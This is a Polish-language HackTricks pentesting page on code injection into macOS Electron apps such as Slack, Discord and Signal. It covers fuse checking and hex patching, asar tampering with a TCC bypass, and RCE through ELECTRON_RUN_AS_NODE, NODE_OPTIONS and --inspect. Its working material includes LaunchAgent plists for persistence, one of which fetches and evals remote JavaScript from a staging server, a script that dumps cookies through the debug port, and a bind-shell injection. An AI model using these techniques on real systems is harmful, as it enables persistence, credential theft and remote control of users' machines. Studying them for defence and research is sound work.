# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Podstawowe informacje

Jeśli nie wiesz, czym jest Electron, możesz znaleźć [**dużo informacji tutaj**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Ale na razie wystarczy, że wiesz, że Electron uruchamia **node**.\
A node ma kilka **parametrów** i **zmiennych środowiskowych**, które można wykorzystać do **wykonywania innego kodu** oprócz wskazanego pliku.

### Fuzje Electron

Te techniki zostaną omówione w następnej kolejności, ale w ostatnich czasach Electron dodał kilka **flagi zabezpieczeń, aby je uniemożliwić**. Oto [**Fuzje Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses) i to one są używane do **zapobiegania** ładowaniu przez aplikacje Electron w macOS **dowolnego kodu**:

- **`RunAsNode`**: Jeśli jest wyłączona, uniemożliwia użycie zmiennej środowiskowej **`ELECTRON_RUN_AS_NODE`** do wstrzykiwania kodu.
- **`EnableNodeCliInspectArguments`**: Jeśli jest wyłączona, parametry takie jak `--inspect`, `--inspect-brk` nie będą respektowane. Unikając w ten sposób wstrzykiwania kodu.
- **`EnableEmbeddedAsarIntegrityValidation`**: Jeśli jest włączona, załadowany **plik** **`asar`** będzie **walidowany** przez macOS. **Zapobiegając** w ten sposób **wstrzykiwaniu kodu** poprzez modyfikację zawartości tego pliku.
- **`OnlyLoadAppFromAsar`**: Jeśli to jest włączone, zamiast szukać ładowania w następującej kolejności: **`app.asar`**, **`app`** i w końcu **`default_app.asar`**. Sprawdzi i użyje tylko app.asar, zapewniając w ten sposób, że gdy jest **połączone** z fuzją **`embeddedAsarIntegrityValidation`**, jest **niemożliwe** **załadowanie niezweryfikowanego kodu**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Jeśli jest włączona, proces przeglądarki używa pliku o nazwie `browser_v8_context_snapshot.bin` dla swojego zrzutu V8.

Inna interesująca fuzja, która nie będzie zapobiegać wstrzykiwaniu kodu, to:

- **EnableCookieEncryption**: Jeśli jest włączona, magazyn ciasteczek na dysku jest szyfrowany za pomocą kluczy kryptograficznych na poziomie systemu operacyjnego.

### Sprawdzanie Fuzji Electron

Możesz **sprawdzić te flagi** z aplikacji za pomocą:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modyfikowanie Fuzji Electron

Jak wspominają [**dokumenty**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), konfiguracja **Fuzji Electron** jest skonfigurowana wewnątrz **binarnego pliku Electron**, który zawiera gdzieś ciąg **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

W aplikacjach macOS zazwyczaj znajduje się to w `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Możesz załadować ten plik w [https://hexed.it/](https://hexed.it/) i wyszukać poprzedni ciąg. Po tym ciągu możesz zobaczyć w ASCII liczbę "0" lub "1", wskazującą, czy każdy bezpiecznik jest wyłączony, czy włączony. Po prostu zmodyfikuj kod hex (`0x30` to `0`, a `0x31` to `1`), aby **zmodyfikować wartości bezpieczników**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Zauważ, że jeśli spróbujesz **nadpisać** binarny plik **`Electron Framework`** wewnątrz aplikacji tymi zmodyfikowanymi bajtami, aplikacja nie będzie działać.

## RCE dodawanie kodu do aplikacji Electron

Mogą istnieć **zewnętrzne pliki JS/HTML**, które wykorzystuje aplikacja Electron, więc atakujący może wstrzyknąć kod do tych plików, których podpis nie będzie sprawdzany, i wykonać dowolny kod w kontekście aplikacji.

> [!CAUTION]
> Jednak w tej chwili istnieją 2 ograniczenia:
>
> - Uprawnienie **`kTCCServiceSystemPolicyAppBundles`** jest **potrzebne** do modyfikacji aplikacji, więc domyślnie nie jest to już możliwe.
> - Skonstruowany plik **`asap`** zazwyczaj ma bezpieczniki **`embeddedAsarIntegrityValidation`** `i` **`onlyLoadAppFromAsar`** `włączone`
>
> Co sprawia, że ta ścieżka ataku jest bardziej skomplikowana (lub niemożliwa).

Zauważ, że można obejść wymóg **`kTCCServiceSystemPolicyAppBundles`** poprzez skopiowanie aplikacji do innego katalogu (np. **`/tmp`**), zmieniając nazwę folderu **`app.app/Contents`** na **`app.app/NotCon`**, **modyfikując** plik **asar** swoim **złośliwym** kodem, zmieniając go z powrotem na **`app.app/Contents`** i uruchamiając go.

Możesz rozpakować kod z pliku asar za pomocą:
```bash
npx asar extract app.asar app-decomp
```
I zapakuj to z powrotem po dokonaniu modyfikacji z:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE z `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Zgodnie z [**dokumentacją**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), jeśli ta zmienna środowiskowa jest ustawiona, uruchomi proces jako normalny proces Node.js.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Jeśli bezpiecznik **`RunAsNode`** jest wyłączony, zmienna env **`ELECTRON_RUN_AS_NODE`** zostanie zignorowana, a to nie zadziała.

### Wstrzykiwanie z Plist aplikacji

Jak [**proponowano tutaj**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), możesz nadużyć tej zmiennej env w plist, aby utrzymać persistencję:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE z `NODE_OPTIONS`

Możesz przechować ładunek w innym pliku i go wykonać:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Jeśli bezpiecznik **`EnableNodeOptionsEnvironmentVariable`** jest **wyłączony**, aplikacja **zignoruje** zmienną środowiskową **NODE_OPTIONS** podczas uruchamiania, chyba że zmienna środowiskowa **`ELECTRON_RUN_AS_NODE`** jest ustawiona, która również będzie **zignorowana**, jeśli bezpiecznik **`RunAsNode`** jest wyłączony.
>
> Jeśli nie ustawisz **`ELECTRON_RUN_AS_NODE`**, napotkasz **błąd**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Wstrzykiwanie z Pliku Plist Aplikacji

Możesz nadużyć tej zmiennej środowiskowej w pliku plist, aby utrzymać persistencję, dodając te klucze:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE z inspekcją

Zgodnie z [**tym**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), jeśli uruchomisz aplikację Electron z flagami takimi jak **`--inspect`**, **`--inspect-brk`** i **`--remote-debugging-port`**, **port debugowania będzie otwarty**, więc możesz się z nim połączyć (na przykład z Chrome w `chrome://inspect`) i będziesz mógł **wstrzyknąć kod** lub nawet uruchomić nowe procesy.\
Na przykład:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Jeśli bezpiecznik **`EnableNodeCliInspectArguments`** jest wyłączony, aplikacja **zignoruje parametry node** (takie jak `--inspect`) podczas uruchamiania, chyba że zmienna środowiskowa **`ELECTRON_RUN_AS_NODE`** jest ustawiona, która również będzie **zignorowana**, jeśli bezpiecznik **`RunAsNode`** jest wyłączony.
>
> Możesz jednak nadal użyć parametru **`--remote-debugging-port=9229`**, ale poprzedni ładunek nie zadziała, aby uruchomić inne procesy.

Używając parametru **`--remote-debugging-port=9222`**, możliwe jest kradzież niektórych informacji z aplikacji Electron, takich jak **historia** (za pomocą poleceń GET) lub **ciasteczka** przeglądarki (ponieważ są **odszyfrowane** wewnątrz przeglądarki i istnieje **punkt końcowy json**, który je zwróci).

Możesz nauczyć się, jak to zrobić [**tutaj**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) i [**tutaj**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) oraz użyć automatycznego narzędzia [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) lub prostego skryptu, takiego jak:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
W [**tym wpisie na blogu**](https://hackerone.com/reports/1274695) to debugowanie jest wykorzystywane do sprawienia, że headless chrome **pobiera dowolne pliki w dowolnych lokalizacjach**.

### Wstrzykiwanie z Plist Aplikacji

Możesz wykorzystać tę zmienną środowiskową w plist, aby utrzymać persistencję, dodając te klucze:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass abusing Older Versions

> [!TIP]
> Demon TCC w macOS nie sprawdza wersji aplikacji, która jest uruchamiana. Więc jeśli **nie możesz wstrzyknąć kodu w aplikację Electron** za pomocą żadnej z poprzednich technik, możesz pobrać wcześniejszą wersję APLIKACJI i wstrzyknąć w nią kod, ponieważ nadal uzyska uprawnienia TCC (chyba że Trust Cache to uniemożliwi).

## Run non JS Code

Poprzednie techniki pozwolą ci uruchomić **kod JS wewnątrz procesu aplikacji electron**. Jednak pamiętaj, że **procesy podrzędne działają pod tym samym profilem piaskownicy** co aplikacja nadrzędna i **dziedziczą ich uprawnienia TCC**.\
Dlatego, jeśli chcesz wykorzystać uprawnienia do uzyskania dostępu do kamery lub mikrofonu, możesz po prostu **uruchomić inny plik binarny z procesu**.

## Automatic Injection

Narzędzie [**electroniz3r**](https://github.com/r3ggi/electroniz3r) można łatwo wykorzystać do **znalezienia podatnych aplikacji electron** zainstalowanych i wstrzyknięcia w nie kodu. To narzędzie spróbuje użyć techniki **`--inspect`**:

Musisz skompilować je samodzielnie i możesz użyć go w ten sposób:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Odniesienia

- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{{#include ../../../banners/hacktricks-training.md}}
